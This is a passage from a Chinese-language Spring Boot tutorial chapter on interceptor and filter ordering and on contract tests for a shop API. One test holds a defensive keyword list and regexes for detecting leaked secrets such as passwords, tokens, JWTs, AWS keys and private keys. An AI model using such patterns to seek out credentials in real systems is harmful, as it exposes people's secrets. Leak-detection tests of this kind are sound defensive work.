> 需要情境專屬的說明時，放 `extensions.hint`（03 章 3.6.2）。

**這一章真正新增的是 enum 的顯示文字**，而它在<b>另一個檔案</b>裡：

```
src/main/resources/
├── error-messages_zh_TW.properties   ← 錯誤訊息（03 章 3.4.4，83 × 2 條）
└── messages_zh_TW.properties         ← ★ 顯示文字（6.5.8 的 orderStatus.*）
```

⚠️ **兩個檔案是不同的 `MessageSource` basename**：

```yaml
spring:
  messages:
    # ★ 三個 basename 都要列（完整說明見 02 章 2.8.2）
    basename: messages,validation-messages,error-messages
    encoding: UTF-8
    use-code-as-default-message: false
```

`orderStatus.*` 的完整內容見 **6.5.8**（這裡不重複列出 ——
理由與上面那條「一個 key 只能有一個定義處」是同一個）。

#### `WebMvcConfig`：所有 interceptor 的最終註冊順序

```java
package example.shop.common.config;

import example.shop.common.web.*;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

import java.util.List;

/**
 * Interceptor 與 ArgumentResolver 的註冊（04 章 4.13.2 的最終版）。
 *
 * <p>⚠️ Interceptor 的順序是<b>註冊順序</b>，不是 {@code @Order}（04 章 4.7.3）。
 */
@Configuration
public class WebMvcConfig implements WebMvcConfigurer {

    private final ActorMdcInterceptor actorMdc;
    private final RateLimitInterceptor rateLimit;
    private final UnknownQueryParamInterceptor unknownParams;
    private final StreamingUnsupportedParamInterceptor streamingParams;
    private final ReadOnlyFieldInterceptor readOnlyFields;
    private final PageableGuardInterceptor pageableGuard;
    private final IdempotencyInterceptor idempotency;

    public WebMvcConfig(ActorMdcInterceptor actorMdc,
                        RateLimitInterceptor rateLimit,
                        UnknownQueryParamInterceptor unknownParams,
                        StreamingUnsupportedParamInterceptor streamingParams,
                        ReadOnlyFieldInterceptor readOnlyFields,
                        PageableGuardInterceptor pageableGuard,
                        IdempotencyInterceptor idempotency) {
        this.actorMdc = actorMdc;
        this.rateLimit = rateLimit;
        this.unknownParams = unknownParams;
        this.streamingParams = streamingParams;
        this.readOnlyFields = readOnlyFields;
        this.pageableGuard = pageableGuard;
        this.idempotency = idempotency;
    }

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        // ① MDC 最先 —— 讓後面所有的錯誤 log 都有 actorId（04 章 4.7.5）
        registry.addInterceptor(actorMdc).order(1);

        // ② 限流第二 —— 在昂貴的檢查之前擋掉超量請求（04 章 4.13.2）
        registry.addInterceptor(rateLimit).order(2);

        // ③ 參數檢查（都很便宜，純記憶體判斷）
        registry.addInterceptor(unknownParams).order(3);
        // ★ 06 章新增：串流端點的不支援參數（6.6.6）
        registry.addInterceptor(streamingParams).order(4);
        registry.addInterceptor(pageableGuard).order(5);

        // ④ 06 章新增：唯讀欄位（6.5.5）
        //   ⚠️ 它要讀 body，所以放在便宜的檢查之後
        registry.addInterceptor(readOnlyFields).order(6)
                // ★ 只對有 body 的方法有意義
                .addPathPatterns("/orders/**", "/products/**", "/carts/**");

        // ⑤ 冪等最後 —— 它會查資料庫，最貴（04 章 4.13.2）
        registry.addInterceptor(idempotency).order(7);
    }

    @Override
    public void addArgumentResolvers(
            List<org.springframework.web.method.support.HandlerMethodArgumentResolver> resolvers) {
        resolvers.add(currentActorArgumentResolver);      // 04 章 4.10.2
        resolvers.add(requestContextArgumentResolver);    // 04 章 4.10.3
    }

    // 欄位略（建構子注入）
    private org.springframework.web.method.support.HandlerMethodArgumentResolver
            currentActorArgumentResolver;
    private org.springframework.web.method.support.HandlerMethodArgumentResolver
            requestContextArgumentResolver;
}
```

### 6.9.4 完整的 filter 順序表（04 → 06 章的總結）

**★ 這張表依「實際執行順序」排列**（order 小的先跑）。

| order | 類別 | 職責 | 章節 |
|---|---|---|---|
| `MIN_VALUE` | `ForwardedHeaderFilter`（Boot） | `X-Forwarded-*` | 01 章 1.11.4 |
| `MIN_VALUE` | `CharacterEncodingFilter`（Boot） | UTF-8 | — |
| `MIN_VALUE+1` | `ServerHttpObservationFilter`（Boot） | metrics / tracing | 04 章 4.5.5 |
| -9900 | `FormContentFilter`（Boot） | `PUT`/`PATCH` 的 form | 01 章 1.5.4 |
| **-200** | **`CorsFilter`** | **CORS（含錯誤回應）** | **6.3.5** |
| **-199** | `VaryOriginOptimizationFilter` | CDN 命中率 | 6.3.7 |
| -121 | `TraceIdFilter` | traceId → MDC | 04 章 4.5 |
| -120 | `TrailingSlashRedirectFilter` | 308；**跳過 preflight** | 01 章 1.3.5、**6.3.9** |
| -119 | `IpRateLimitFilter` | 依 IP 限流 | 04 章練習 3 |
| -118 | `RequestSizeLimitFilter` | 只看 `Content-Length` | 05 章 5.3.7 |
| **-117** | **`JsonCharsetFilter`** | 只看 `Content-Type`（**不讀 body**） | **6.4.2** |
| **-116** | `CachedBodyFilter` | **開始讀 body**；跳過 multipart | 04 章 4.4.6、05 章 5.6.4 |
| **-115** | `RequestLoggingFilter` | 三層日誌；**跳過串流** | 04 章 4.6、05 章 5.9.6 |
| **-114** | `AuditFilter` | 稽核事件 | 04 章練習 2 |
| -110 | `ShallowEtagHeaderFilter` | 只套用兩個路徑 | **6.8.1** |
| -105 | `RequestContextFilter`（Boot） | `RequestContextHolder` | — |
| -100 | `springSecurityFilterChain` | 認證、授權、**第二個 CorsFilter** | 06 章、09 站 |
| -99 | `IdempotencyFilter` | 捕捉回應以便重播 | 04 章 4.9.5 |

> ### ⚠️ 兩件容易誤讀的事 ★
>
> **① `CorsFilter` 的 `-200` 不是「全場最前面」。**
> Boot 的 `ForwardedHeaderFilter`、`CharacterEncodingFilter`
> 是 `Integer.MIN_VALUE`，`ServerHttpObservationFilter` 是 `MIN_VALUE+1` ——
> 它們都比 `-200` **早**執行。
>
> `-200` 的真正意義是「**早於我們自己寫的每一個 filter**」，
> 而那正是我們需要的：CORS 標頭要在
> 限流的 429、大小限制的 413、308 轉址之前就設好（6.2.1）。
>
> ⚠️ **而那三個 Boot 的 filter 不會產生錯誤回應**
> （`CharacterEncodingFilter` 只設編碼、`ObservationFilter` 只記指標），
> 所以「它們在 CORS 之前」沒有問題。
> **07 章 7.11.2 的 `CorsFilter一定是第一個()` 測試必須把它們排除**，
> 否則那個測試永遠是紅的。
>
> **② `FormContentFilter` 的 `-9900` 比 `-200` 小。**
> 它排在表格的第四列不是筆誤 —— `-9900 < -200`。
> ⚠️ 這意味著它在 `CorsFilter` **之前**讀 body（把 form 參數解析出來）。
> 對 shop-service 沒有影響（我們不收 form），
> 但如果哪天要收，就要注意「它讀過的 body 之後讀不到了」（04 章 4.4.6）。

**★ `-118` / `-117` / `-116` / `-115` / `-114` 這一段的順序是刻意的**，
而它曾經是錯的（`JsonCharsetFilter` 與 `CachedBodyFilter` 都是 `-117`）：

```java
    // ★ 每個 filter 一個【唯一】的 order，讓執行順序可預測
    //
    //   -118 RequestSizeLimitFilter   只看 Content-Length（最便宜）
    //   -117 JsonCharsetFilter        只看 Content-Type（還是不讀 body）
    //   -116 CachedBodyFilter         ★ 從這裡開始讀 body
    //   -115 RequestLoggingFilter
    //   -114 AuditFilter
    //
    // ⚠️ JsonCharsetFilter 一定要在 CachedBodyFilter 【之前】：
    //   如果順序反了，一個 charset=Big5 的 JSON 會先被快取成錯的位元組，
    //   而 CachedBodyFilter 快取的是【原始 byte】，所以之後怎麼擋都來不及 ——
    //   controller 拿到的是亂碼。
    public static final int REQUEST_SIZE_LIMIT_FILTER_ORDER = -118;
    public static final int JSON_CHARSET_FILTER_ORDER       = -117;
    public static final int CACHED_BODY_FILTER_ORDER        = -116;
    public static final int REQUEST_LOGGING_FILTER_ORDER    = -115;
    public static final int AUDIT_FILTER_ORDER              = -114;
```

⚠️ **同一個 order 值的兩個 filter，執行順序是「未定義」的**
（依 Spring 收集 bean 的順序，而那可能隨版本改變）。
症狀是「本機正常、CI 正常、正式環境某次重新部署後壞掉」。

**修正後的分配**：

```
-121  TraceIdFilter
-120  TrailingSlashRedirectFilter
-119  IpRateLimitFilter
-118  RequestSizeLimitFilter        ← 只看 Content-Length
-117  JsonCharsetFilter             ← 只看 Content-Type      ★ 06 章新增
-116  CachedBodyFilter              ← 開始讀 body            ★ 從 -117 改成 -116
-115  RequestLoggingFilter          ← 從 -116 改成 -115
-114  AuditFilter                   ← 從 -115 改成 -114
```

**而「order 值是唯一的」這件事要有一個測試守住** ★

```java
package example.shop.contract;

import jakarta.servlet.Filter;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.web.servlet.FilterRegistrationBean;
import org.springframework.context.ApplicationContext;
import org.springframework.core.Ordered;
import org.springframework.core.annotation.Order;

import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * 「每個 filter 的 order 都是唯一的」測試。
 *
 * <p>★★ 為什麼需要它：兩個 filter 有相同的 order 時，
 * 執行順序是<b>未定義</b>的（依 Spring 收集 bean 的順序）。
 * 那會造成「同一份程式碼在不同機器上行為不同」，
 * 或「升級 Boot 的 patch 版本後某個 filter 突然壞了」。
 *
 * <p>而這類 bug 極難查，因為它「大部分時候是對的」。
 */
@SpringBootTest
class FilterOrderUniquenessTest {

    @Autowired ApplicationContext context;

    @Test
    @DisplayName("自訂 filter 的 order 值不重複")
    void order唯一() {
        Map<Integer, List<String>> byOrder = new LinkedHashMap<>();

        // ① FilterRegistrationBean 註冊的
        context.getBeansOfType(FilterRegistrationBean.class)
                .forEach((name, registration) -> {
                    Filter filter = (Filter) registration.getFilter();
                    if (filter == null) return;
                    if (!filter.getClass().getName().startsWith("example.shop")
                            && !"corsFilter".equals(registration.getFilterName())) {
                        return;                      // 只檢查我們自己的
                    }
                    byOrder.computeIfAbsent(registration.getOrder(),
                            k -> new java.util.ArrayList<>())
                            .add(filter.getClass().getSimpleName());
                });

        // ② @Component + @Order 註冊的
        context.getBeansOfType(Filter.class)
                .forEach((name, filter) -> {
                    if (!filter.getClass().getName().startsWith("example.shop")) return;
                    Order annotation = filter.getClass().getAnnotation(Order.class);
                    int order = (annotation != null)
                            ? annotation.value() : Ordered.LOWEST_PRECEDENCE;
                    byOrder.computeIfAbsent(order, k -> new java.util.ArrayList<>())
                            .add(filter.getClass().getSimpleName());
                });

        List<String> duplicates = byOrder.entrySet().stream()
                .filter(e -> e.getValue().size() > 1)
                .map(e -> "order=%d → %s".formatted(e.getKey(), e.getValue()))
                .toList();

        assertThat(duplicates)
                .as("""
                    有 filter 使用了相同的 order 值。

                    相同 order 的 filter 執行順序是【未定義】的 ——
                    它依賴 Spring 收集 bean 的順序，而那可能隨版本改變。

                    請參考 06 章 6.9.4 的順序表，給每個 filter 一個唯一的 order。
                    """)
                .isEmpty();

        // ★ 順便印出實際的順序 —— 這比讀文件可靠
        System.out.println("=== Filter 執行順序 ===");
        byOrder.entrySet().stream()
                .sorted(Map.Entry.comparingByKey())
                .forEach(e -> System.out.printf("%8d  %s%n", e.getKey(), e.getValue()));
    }

    @Test
    @DisplayName("★ CorsFilter 排在所有自訂 filter 之前（6.3.5）")
    void CorsFilter最先() {
        int corsOrder = context.getBeansOfType(FilterRegistrationBean.class).values().stream()
                .filter(r -> "corsFilter".equals(r.getFilterName()))
                .findFirst()
                .map(FilterRegistrationBean::getOrder)
                .orElseThrow(() -> new AssertionError("找不到 corsFilter 的註冊"));

        int minCustomOrder = context.getBeansOfType(Filter.class).entrySet().stream()
                .filter(e -> e.getValue().getClass().getName().startsWith("example.shop"))
                .mapToInt(e -> {
                    Order annotation = e.getValue().getClass().getAnnotation(Order.class);
                    return (annotation != null) ? annotation.value() : Ordered.LOWEST_PRECEDENCE;
                })
                .min()
                .orElse(Integer.MAX_VALUE);

        assertThat(corsOrder)
                .as("""
                    CorsFilter 沒有排在所有自訂 filter 之前。

                    後果：那些 filter 產生的錯誤回應（429、413、308）
                    不會有 Access-Control-Allow-Origin，
                    前端只會看到「Network Error」（06 章 6.2.1）。
                    """)
                .isLessThan(minCustomOrder);
    }
}
```

---

## 6.10 測試

**這一章的測試大部分已經寫在各節裡。這一節補上三個「掃描型」的測試** ——
它們的共同特徵是：**不針對特定端點，而是掃描整個 API 的表面**。

### 6.10.1 測試地圖

| 測試 | 守住什麼 | 節 |
|---|---|---|
| `CorsOnErrorResponsesTest` | 每一種錯誤都有 CORS 標頭 | 6.3.5 |
| `FilterOrderUniquenessTest` | order 唯一 + CorsFilter 最先 | 6.9.4 |
| `RangeSupportRegressionTest` | `extendMessageConverters` 沒被改成 `configure…` | 6.4.5 |
| `JacksonContractTest` | 關鍵設定沒被改 | 6.5.10 |
| `JsonNamingConventionTest` | 欄位名都是 camelCase | 6.5.4 |
| `StatusLabelCompletenessTest` | 每個 enum 值都有中文 label | 6.5.8 |
| `SealedSubtypeConsistencyTest` | `permits` 與 `@JsonSubTypes` 一致 | 6.7.1 |
| `DtoSerializabilityTest` | 全 null 也能序列化 | 6.7.4 |
| `ResponseBodyAdviceCoverageTest` | 串流端點清單 | 6.6.6 |
| `JsonBombTest` | 深度／字串／數字炸彈 | 6.7.3 |
| **`SensitiveFieldScanTest`** | **回應不含敏感欄位** | **6.10.2** |
| **`OpenApiConsistencyTest`** | **契約與實作一致** | **6.10.3** |
| `ObjectMapperUsageTest`（ArchUnit） | 不可 `new ObjectMapper()` | 6.5.2 |
| `DtoTypeRulesTest`（ArchUnit） | 不可用 `LocalDateTime` / Entity | 6.5.6、6.7.5 |

### 6.10.2 敏感欄位的掃描測試 ★

```java
package example.shop.contract;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import io.swagger.v3.oas.models.OpenAPI;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.web.servlet.MockMvc;

import java.util.*;
import java.util.regex.Pattern;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;

/**
 * 掃描所有回應，確認沒有敏感欄位。
 *
 * <p>★★ 這個測試的做法是本章最值得學的一個：
 * <b>它不檢查「某個特定 DTO」，而是打過所有 GET 端點並掃描實際的回應。</b>
 *
 * <p>為什麼這比「檢查 DTO 的欄位」強：
 * <ul>
 *   <li>涵蓋 {@code Map<String, Object>} 型別的欄位（它的內容不受型別檢查，6.7.5）。</li>
 *   <li>涵蓋 {@code @JsonAnyGetter} 平鋪的欄位（03 章的 {@code Problem.extensions}）。</li>
 *   <li>涵蓋 Hibernate proxy 意外洩漏的欄位（6.7.5 的第 6 項）。</li>
 *   <li>涵蓋「有人呼叫 {@code MaskedCardNumber.raw()} 然後放進 String 欄位」——
 *       型別防不了，但這個測試看得到值。</li>
 * </ul>
 *
 * <p>⚠️ 它的限制：只涵蓋「測試資料裡有的情況」。
 * 所以它是<b>第二層</b>防護（第一層是型別與 code review）。
 */
@SpringBootTest
@AutoConfigureMockMvc
class SensitiveFieldScanTest {

    /**
     * 絕不可以出現在回應裡的欄位名（不分大小寫，比對「包含」）。
     *
     * <p>★ 這份清單本身就是文件：它告訴讀者「我們認為哪些欄位是敏感的」。
     */
    private static final List<String> FORBIDDEN_FIELD_NAMES = List.of(
            // 認證
            "password", "passwordhash", "passwd", "secret", "privatekey",
            "accesstoken", "refreshtoken", "apikey", "apisecret",
            // 金流（後四碼可以，完整卡號不行 —— 靠下面的值比對）
            "cvv", "cvc", "securitycode", "fullcardnumber",
            // 個資（身分證、護照）
            // ⚠️ 這裡刻意【沒有】"taxid"：
            //    發票的統一編號（invoice.taxId）是一個【正當而且必要】的回應欄位 ——
            //    使用者要能看到「我開給哪一個統編」。
            //    ★ 第一版把它放進來了，於是所有含發票的訂單回應都會讓這個測試紅燈，
            //      而「修法」很容易變成「把 invoice 從回應移除」—— 那是修錯方向。
            //    ★ 它的保護在別的地方：
            //        · ValueMasker（03 章 3.9.6）讓它不出現在【錯誤訊息】裡
            //        · BodyMasker（04 章 4.6.4）讓它不出現在【日誌】裡
            //      「回應裡有」與「日誌裡有」是兩件事。
            "nationalid", "idnumber", "passportnumber", "ssn",
            // 內部
            "hibernatelazyinitializer", "handler", "targetsource",
            "internalcost", "costprice", "margin",
            // 除錯資訊
            "stacktrace", "stack_trace", "exceptionclass", "sqlstate", "sql");

    /**
     * 絕不可以出現在回應裡的<b>值的樣式</b>。
     *
     * <p>★ 這一組比「欄位名」更重要：欄位名可以被改，值的樣式不會。
     */
    private static final Map<String, Pattern> FORBIDDEN_VALUE_PATTERNS = Map.of(
            "完整的信用卡號（Luhn 有效的 13～19 位）",
                    Pattern.compile("\\b(?:4\\d{12}(?:\\d{3})?|5[1-5]\\d{14}|3[47]\\d{13})\\b"),
            "bcrypt hash", Pattern.compile("\\$2[aby]?\\$\\d{2}\\$[./A-Za-z0-9]{53}"),
            "JWT", Pattern.compile("eyJ[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}\\."),
            "AWS access key", Pattern.compile("\\b(AKIA|ASIA)[0-9A-Z]{16}\\b"),
            "私鑰", Pattern.compile("-----BEGIN [A-Z ]*PRIVATE KEY-----"),
            "JDBC 連線字串", Pattern.compile("jdbc:[a-z]+://[^\\s\"]+"),
            "檔案系統路徑", Pattern.compile("(/opt/app|/var/lib/|C:\\\\\\\\Users\\\\\\\\)"));

    /**
     * ★ 明確的例外：這些「命中禁用清單但實際上是正當欄位」的路徑。
     *
     * <p>格式是 {@code $.path.to.field}（掃描時比對的 JSON path）。
     *
     * <p>⚠️ <b>加進來一定要在 PR 說明為什麼</b> ——
     * 這份清單每長一行，這個測試就弱一點。
     */
    private static final Set<String> ALLOWED_PATHS = Set.of(
            // maskedPhone 含 "phone"，但它已經是遮蔽後的值（0912****78）
            "$.shippingAddress.maskedPhone",
            "$.content[*].shippingAddress.maskedPhone",
            // 信用卡的後四碼是 PCI-DSS 明確允許顯示的
            "$.payments[*].cardLast4");

    @Autowired MockMvc mockMvc;
    @Autowired ObjectMapper objectMapper;

    /**
     * 要掃描的端點。
     *
     * <p>⚠️ 手動維護這份清單會過時。
     * <b>更好的做法</b>是從 {@code RequestMappingHandlerMapping} 列出所有 GET 端點，
     * 並用測試資料填入路徑變數 —— 見 {@link #allGetEndpoints()}。
     */
    static List<String> endpointsToScan() {
        return List.of(
                "/products",
                "/products/P-1001",
                "/categories",
                "/orders",
                "/orders/ord_1",
                "/orders/ord_1/items",
                "/orders/ord_1/payments",
                "/orders/ord_1/status-changes",
                "/orders/ord_1/receipts",
                "/order-exports",
                "/order-exports/exp_1",
                "/me",
                "/me/addresses",
                "/carts/current");
    }

    @Test
    @DisplayName("★★ 所有 GET 端點的回應都不含敏感欄位或敏感值")
    void 掃描所有回應() throws Exception {
        List<String> violations = new ArrayList<>();

        // ★ 用三種身分各掃一次 —— 客服版的 DTO 欄位更多，風險更高
        for (var identity : List.of("customer", "support", "admin")) {
            for (String endpoint : endpointsToScan()) {
                var result = mockMvc.perform(get(endpoint).with(as(identity))).andReturn();

                int status = result.getResponse().getStatus();
                if (status >= 400) {
                    // ★ 錯誤回應也要掃！（03 章 3.11.2 的資訊洩漏）
                    // 但 404 / 403 是預期的（某些端點對某些身分不開放）
                    if (status == 404 || status == 403) continue;
                }

                String body = result.getResponse().getContentAsString(
                        java.nio.charset.StandardCharsets.UTF_8);
                if (body.isBlank()) continue;

                scan(endpoint + " [" + identity + "]", body, violations);
            }
        }

        assertThat(violations)
                .as("""
                    在 API 回應裡發現敏感欄位或敏感值（06 章 6.10.2）。

                    這是一個資料洩漏 —— 請立刻處理：
                      1. 如果是欄位名：從 DTO 移除它，或用 @Masked（6.6.2）
                      2. 如果是值的樣式：檢查填入那個欄位的程式碼
                      3. 如果是 hibernateLazyInitializer：DTO 裡有 Entity（6.7.5）
                    """)
                .isEmpty();
    }

    private void scan(String context, String body, List<String> violations)
            throws Exception {

        // ── ① 值的樣式（先做 —— 它不需要解析 JSON）───────────────
        FORBIDDEN_VALUE_PATTERNS.forEach((name, pattern) -> {
            var matcher = pattern.matcher(body);
            if (matcher.find()) {
                // ⚠️ 不要把找到的值放進錯誤訊息（那會讓它進 CI 的 log）
                violations.add("%s → 發現「%s」（位置 %d）"
                        .formatted(context, name, matcher.start()));
            }
        });

        // ── ② 欄位名 ────────────────────────────────────────────
        JsonNode tree;
        try {
            tree = objectMapper.readTree(body);
        } catch (Exception e) {
            return;                 // 不是 JSON（CSV、二進位）→ 跳過欄位掃描
        }
        scanFieldNames(context, tree, "$", violations);
    }

    /** 把陣列索引正規化成 {@code [*]}，讓 ALLOWED_PATHS 不必列舉每一個索引。 */
    private static String normalize(String jsonPath) {
        return jsonPath.replaceAll("\\[\\d+\\]", "[*]");
    }

    private void scanFieldNames(String context, JsonNode node, String path,
                                List<String> violations) {
        if (node.isObject()) {
            node.fieldNames().forEachRemaining(name -> {
                String normalized = name.toLowerCase(Locale.ROOT)
                        .replace("_", "").replace("-", "");
                String fieldPath = path + "." + name;
                for (String forbidden : FORBIDDEN_FIELD_NAMES) {
                    if (!normalized.contains(forbidden)) continue;
                    // ★ 明確核准過的例外
                    if (ALLOWED_PATHS.contains(normalize(fieldPath))) continue;
                    violations.add("%s → 欄位 %s（命中「%s」）%n%s"
                            .formatted(context, fieldPath, forbidden,
                                    "  如果這是正當欄位，把 " + normalize(fieldPath)
                                    + " 加進 ALLOWED_PATHS 並在 PR 說明理由"));
                }
                scanFieldNames(context, node.get(name), path + "." + name, violations);
            });
        } else if (node.isArray()) {
            int i = 0;
            for (JsonNode child : node) {
                scanFieldNames(context, child, path + "[" + i++ + "]", violations);
            }
        }
    }

    /**
     * ★ 進階版：從 handler mapping 自動列出所有 GET 端點。
     *
     * <p>優點：不會漏掉新加的端點。
     * <p>⚠️ 缺點：需要為路徑變數填入「測試資料裡真的存在」的值 ——
     * 否則全部回 404，測試就變成「掃描 404 的回應」（沒有意義）。
     *
     * <p>shop-service 的做法：一份「路徑變數 → 測試值」的對照表，
     * 而如果某個變數名不在表裡，測試<b>失敗</b>（而不是跳過）——
     * 那強迫加新端點的人也加上測試資料。
     */
    static Map<String, String> pathVariableSamples() {
        return Map.of(
                "orderId", "ord_1",
                "productId", "P-1001",
                "categoryId", "cat_1",
                "receiptId", "rcp_1",
                "exportId", "exp_1",
                "imageId", "img_01k39w5r7qz8h2n4m6p8v0x2c4",
                "paymentId", "pay_1",
                "addressId", "adr_1",
                "itemId", "itm_1");
    }

    private org.springframework.test.web.servlet.request.RequestPostProcessor
            as(String identity) {
        return switch (identity) {
            case "support" -> support("stf_1");
            case "admin"   -> admin("adm_1");
            default        -> customer("cus_1");
        };
    }

    // 輔助方法略（同 05 章 5.13.1）
}
```

⚠️ **`FORBIDDEN_VALUE_PATTERNS` 的「完整信用卡號」那條 regex 值得說明**：
它只比對三種主要卡別的**前綴 + 長度**（Visa `4`、Mastercard `51-55`、Amex `34/37`）。
它會有偽陰性（其他卡別）與偽陽性（一個剛好符合的訂單編號）。
**但它抓到過真實的洩漏**，而那個價值遠大於偶爾的偽陽性。

⚠️ **「不要把找到的值放進錯誤訊息」是一個容易忽略的細節**：
測試失敗的訊息會進 CI 的 log、進 Slack 通知、進 GitHub 的 PR 評論。
**如果訊息裡有那個卡號，你就把洩漏擴散了。**

### 6.10.3 OpenAPI 與實作的一致性測試

```java
package example.shop.contract;

import io.swagger.v3.oas.models.OpenAPI;
import io.swagger.v3.oas.models.media.Schema;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.web.servlet.MockMvc;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;

/**
 * OpenAPI 文件與實作的一致性。
 *
 * <p>★ 這一章關心兩件事：
 * <ol>
 *   <li><b>enum 一律用 {@code x-extensible-enum} 而不是 {@code enum}</b>（6.5.8）——
 *       用 {@code enum} 會讓客戶端產生器產生封閉的型別，
 *       那正是 6.2.4 那個 App 崩潰的原因。</li>
 *   <li><b>金額一律是 string 而不是 number</b>（6.5.7）。</li>
 * </ol>
 *
 * <p>⚠️⚠️ <b>這個測試讀的是手寫的 {@code orders-api.yaml}，不是 {@code /v3/api-docs}。</b> ★★
 *
 * <p>第一版寫成打 {@code /v3/api-docs}，那是錯的 ——
 * 因為 07 章 7.10.4 的決定是
 * <b>{@code springdoc.api-docs.enabled=false}</b>：
 *
 * <pre>
 * springdoc:
 *   api-docs:
 *     enabled: false          # ★ 不從程式碼產生（否則會有兩份互相矛盾的 OpenAPI）
 *   swagger-ui:
 *     enabled: true
 *     url: /openapi/orders-api.yaml   # ★ 直接餵手寫的那一份
 * </pre>
 *
 * <p>所以 {@code /v3/api-docs} 會回 404，而這個測試會變成
 * 「掃描一份空的 schema 清單」——<b>永遠通過、什麼都沒測</b>
 * （正是 07 章 7.2.3 那一類的假綠燈）。
 *
 * <p>★ shop-service 是 <b>contract-first</b>：{@code orders-api.yaml} 是唯一的真相來源。
 * 所以這個測試的正確做法是<b>直接讀那份 YAML</b>，
 * 而「實作符不符合它」由 07 章 7.10.2 的
 * {@code swagger-request-validator} 負責（那是另一個方向的檢查）。
 *
 * <table>
 *   <tr><th>測試</th><th>方向</th><th>抓什麼</th></tr>
 *   <tr><td><b>這一個</b>（6.10.3）</td><td>檢查<b>契約本身</b>的規則</td>
 *       <td>金額是 string、enum 是 x-extensible-enum、錯誤是 Problem</td></tr>
 *   <tr><td>7.10.2 {@code OpenApiContractTest}</td><td>實作 → 契約</td>
 *       <td>「實際回應」符合契約的 schema</td></tr>
 * </table>
 */
@SpringBootTest
class OpenApiConsistencyTest {

    /** 名稱看起來像金額的欄位。 */
    private static final Pattern MONEY_FIELD = Pattern.compile(
            "(?i)^(amount|total|subtotal|price|fee|discount|tax|refund|balance|"
            + "shippingFee|unitPrice|.*Amount|.*Price|.*Fee|.*Total)$");

    @Autowired MockMvc mockMvc;
    @Autowired com.fasterxml.jackson.databind.ObjectMapper objectMapper;

    @Test
    @DisplayName("★ 金額欄位在 schema 裡都是 string")
    void 金額是字串() throws Exception {
        var apiDocs = fetchApiDocs();
        List<String> violations = new ArrayList<>();

        apiDocs.path("components").path("schemas").fields().forEachRemaining(schema -> {
            String schemaName = schema.getKey();
            schema.getValue().path("properties").fields().forEachRemaining(property -> {
                String fieldName = property.getKey();
                if (!MONEY_FIELD.matcher(fieldName).matches()) return;

                String type = property.getValue().path("type").asText("");
                if (!"string".equals(type)) {
                    violations.add("%s.%s 的型別是 %s（應該是 string）"
                            .formatted(schemaName, fieldName, type));
                }
            });
        });

        assertThat(violations)
                .as("""
                    有金額欄位在 OpenAPI schema 裡是 number（06 章 6.5.7）。

                    JSON number 有精度問題：
                      · JavaScript 的 Number 是 IEEE 754 double
                      · 1280.50 會變成 1280.5（尾數 0 消失）
                      · 超過 2^53 的整數會失去精度

                    請把 DTO 的欄位型別改成 String，並用 MoneyFormat 格式化。
                    """)
                .isEmpty();
    }

    @Test
    @DisplayName("★★ 回應的 enum 都用 x-extensible-enum")
    void enum是開放的() throws Exception {
        var apiDocs = fetchApiDocs();
        List<String> violations = new ArrayList<>();

        apiDocs.path("components").path("schemas").fields().forEachRemaining(schema -> {
            String schemaName = schema.getKey();

            // ⚠️ 只檢查「回應」的 schema —— 請求的 enum 用封閉的 enum 是對的
            //   （客戶端不送新值就沒事，03-rest-api 3.10.4）
            if (schemaName.endsWith("Request") || schemaName.endsWith("Command")) {
                return;
            }

            schema.getValue().path("properties").fields().forEachRemaining(property -> {
                var node = property.getValue();
                if (node.has("enum") && !node.has("x-extensible-enum")) {
                    violations.add("%s.%s 用了封閉的 enum"
                            .formatted(schemaName, property.getKey()));
                }
            });
        });

        assertThat(violations)
                .as("""
                    有回應欄位在 OpenAPI 裡用了封閉的 enum（06 章 6.5.8）。

                    後果：客戶端產生器會產生封閉的型別（Swift enum、Kotlin enum），
                    而新增一個 enum 值會讓那些客戶端【解析整個回應時崩潰】——
                    那正是 2026-07-14 那次 340 則一星評論的原因。

                    修法：
                      · 用 @Schema(extensions = @Extension(...)) 標註 x-extensible-enum
                      · 或者讓 DTO 的欄位型別是 String（而不是 enum），
                        並額外提供 statusLabel（6.5.8 方向 2）
                    """)
                .isEmpty();
    }

    @Test
    @DisplayName("★ 每個 4xx/5xx 回應的 schema 都是 Problem")
    void 錯誤格式一致() throws Exception {
        var apiDocs = fetchApiDocs();
        List<String> violations = new ArrayList<>();

        apiDocs.path("paths").fields().forEachRemaining(path -> {
            path.getValue().fields().forEachRemaining(operation -> {
                var responses = operation.getValue().path("responses");
                responses.fields().forEachRemaining(response -> {
                    String status = response.getKey();
                    if (!status.startsWith("4") && !status.startsWith("5")) return;

                    var schemaRef = response.getValue()
                            .path("content")
                            .path("application/problem+json")
                            .path("schema")
                            .path("$ref").asText("");

                    if (!schemaRef.endsWith("/Problem")) {
                        violations.add("%s %s → %s 的 schema 不是 Problem（是「%s」）"
                                .formatted(operation.getKey().toUpperCase(),
                                           path.getKey(), status,
                                           schemaRef.isEmpty() ? "缺少" : schemaRef));
                    }
                });
            });
        });

        assertThat(violations)
                .as("錯誤回應的格式不一致（03 章 3.6 的統一格式）")
                .isEmpty();
    }

    /**
     * 讀手寫的 {@code orders-api.yaml}（唯一的真相來源）。
     *
